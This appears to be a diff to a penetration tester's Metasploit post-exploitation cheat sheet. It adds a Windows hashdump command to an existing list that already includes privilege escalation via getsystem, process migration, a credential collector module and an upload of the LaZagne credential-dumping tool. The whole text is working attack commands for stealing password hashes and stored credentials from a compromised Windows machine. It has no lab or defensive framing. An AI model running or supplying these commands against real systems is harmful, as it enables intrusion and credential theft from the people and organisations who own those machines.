@@ -4,7 +4,9 @@ run autoroute -p
 ps
 migrate ***
 getsystem
+run post/windows/gather/hashdump
 run post/gather/credentials/credential_collector
+
 -------------------------------------------------
 upload /root/laZagne.exe c:\
 --------------------------------------------------
